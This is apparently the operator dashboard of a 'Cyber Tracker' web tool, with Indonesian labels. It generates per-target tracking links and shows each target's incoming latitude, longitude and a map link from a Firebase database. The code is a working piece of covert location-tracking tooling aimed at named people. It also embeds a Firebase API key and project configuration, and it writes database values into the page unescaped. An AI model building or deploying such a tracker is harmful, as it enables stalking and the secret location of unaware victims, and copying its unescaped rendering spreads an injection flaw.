<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CYBER TRACKER // DASHBOARD</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #0a0e14;
      color: #00ff9d;
      min-height: 100vh;
      padding: 15px;
      position: relative;
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image: 
        linear-gradient(rgba(0,255,157,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,157,0.04) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: 0;
    }
    .scanline {
      position: fixed;
      inset: 0;
      background: linear-gradient(transparent 50%, rgba(0,255,157,0.03) 50%);
      background-size: 100% 4px;
      pointer-events: none;
      z-index: 1;
    }
    .wrap { position: relative; z-index: 2; max-width: 600px; margin: 0 auto; }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 2px solid #00ff9d;
      padding-bottom: 10px;
      margin-bottom: 15px;
      text-shadow: 0 0 10px #00ff9d;
    }
    .header h1 { font-size: 16px; letter-spacing: 3px; }
    .status {
      font-size: 11px;
      color: #00ff9d;
      letter-spacing: 1px;
    }
    .status::before {
      content: '●';
      color: #00ff9d;
      animation: blink 1s infinite;
      margin-right: 5px;
    }
    @keyframes blink { 50% { opacity: 0.3; } }
    .box {
      background: rgba(10, 20, 30, 0.85);
      border: 1px solid #00ff9d;
      border-radius: 5px;
      padding: 20px;
      margin-bottom: 15px;
      box-shadow: 0 0 15px rgba(0,255,157,0.3), inset 0 0 10px rgba(0,255,157,0.03);
      position: relative;
    }
    .box::before {
      content: '';
      position: absolute;
      top: -1px; left: 15px; right: 15px;
      height: 1px;
      background: #00ff9d;
      box-shadow: 0 0 10px #00ff9d;
    }
    .box-title {
      font-size: 12px;
      letter-spacing: 3px;
      margin-bottom: 15px;
      color: #00ff9d;
      text-shadow: 0 0 8px #00ff9d;
    }
    .user-info {
      font-size: 13px;
      letter-spacing: 1px;
      margin-bottom: 15px;
      color: #7dfcce;
    }
    input {
      width: 65%;
      padding: 10px 12px;
      background: rgba(0,255,157,0.05);
      border: 1px solid #00ff9d;
      border-radius: 3px;
      color: #00ff9d;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      letter-spacing: 1px;
      outline: none;
      transition: all 0.3s;
    }
    input::placeholder { color: rgba(0,255,157,0.4); }
    input:focus { box-shadow: 0 0 12px #00ff9d; background: rgba(0,255,157,0.1); }
    button {
      padding: 10px 18px;
      background: transparent;
      border: 1px solid #00ff9d;
      color: #00ff9d;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      letter-spacing: 2px;
      cursor: pointer;
      transition: all 0.3s;
      text-shadow: 0 0 5px #00ff9d;
      border-radius: 3px;
      margin-left: 5px;
    }
    button:hover {
      background: #00ff9d;
      color: #0a0e14;
      box-shadow: 0 0 15px #00ff9d;
      text-shadow: none;
    }
    #logout {
      border-color: #ff3366;
      color: #ff3366;
      text-shadow: 0 0 5px #ff3366;
      margin: 0;
      padding: 6px 12px;
      font-size: 11px;
    }
    #logout:hover {
      background: #ff3366;
      color: #0a0e14;
      box-shadow: 0 0 15px #ff3366;
    }
    #link {
      margin-top: 15px;
      word-break: break-all;
      font-size: 12px;
      line-height: 1.6;
    }
    #link a {
      color: #00d4ff;
      text-decoration: none;
      text-shadow: 0 0 5px #00d4ff;
      border-bottom: 1px dashed #00d4ff;
    }
    #link a:hover { text-shadow: 0 0 15px #00d4ff; }
    .item {
      padding: 12px;
      margin-bottom: 8px;
      border-left: 3px solid #00ff9d;
      background: rgba(0,255,157,0.05);
      font-size: 13px;
      line-height: 1.6;
      border-radius: 0 3px 3px 0;
    }
    .item b { color: #00ff9d; text-shadow: 0 0 8px #00ff9d; letter-spacing: 1px; }
    .item a { color: #00d4ff; text-decoration: none; text-shadow: 0 0 5px #00d4ff; }
    .item a:hover { text-decoration: underline; }
    .coord { color: #7dfcce; font-size: 12px; }
    .empty { color: rgba(0,255,157,0.5); font-size: 12px; letter-spacing: 1px; }
    .label { font-size: 11px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
  </style>
</head>
<body>
  <div class="scanline"></div>
  <div class="wrap">
    <div class="header">
      <h1>[ CYBER TRACKER ]</h1>
      <button id="logout" onclick="logout()">LOGOUT</button>
    </div>

    <div class="box">
      <div class="box-title">» OPERATOR</div>
      <div class="user-info">USER: <span id="u" style="color:#00ff9d;text-shadow:0 0 8px #00ff9d"></span></div>
      <div class="status">CONNECTED</div>
    </div>

    <div class="box">
      <div class="box-title">» GENERATE TRACKING LINK</div>
      <div class="label">TARGET NAME:</div>
      <input id="target" placeholder="masukkan nama target" autocomplete="off">
      <button onclick="genLink()">GENERATE</button>
      <div id="link"></div>
    </div>

    <div class="box">
      <div class="box-title">» INCOMING LOCATION DATA</div>
      <div id="hasil"><span class="empty">Waiting for data...</span></div>
    </div>
  </div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain: "roraxbali-65802.firebaseapp.com",
  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "roraxbali-65802",
  storageBucket: "roraxbali-65802.firebasestorage.app",
  messagingSenderId: "750633313866",
  appId: "1:750633313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const user = localStorage.getItem('username');
if (!user) location.href = 'index.html';
document.getElementById('u').innerText = user;

function logout() {
  localStorage.removeItem('username');
  location.href = 'index.html';
}
window.logout = logout;

function genLink() {
  const target = document.getElementById('target').value.trim() || 'target';
  const base = location.origin + location.pathname.replace('dashboard.html', '');
  const url = `${base}track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
  document.getElementById('link').innerHTML = 
    `» LINK:<br><a href="${url}" target="_blank">${url}</a>`;
}
window.genLink = genLink;

onValue(ref(db, 'lokasi/' + user), snap => {
  const data = snap.val();
  if (!data) {
    document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
    return;
  }
  const arr = Object.values(data).sort((a,b) => b.waktu - a.waktu);
  document.getElementById('hasil').innerHTML = arr.map(d => `
    <div class="item">
      <b>${d.target || 'target'}</b> — ${new Date(d.waktu).toLocaleString('id-ID')}<br>
      <span class="coord">📍 ${d.lat}, ${d.lng}</span><br>
      🗺️ <a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP</a>
    </div>
  `).join('');
});
</script>
</body>
</html>
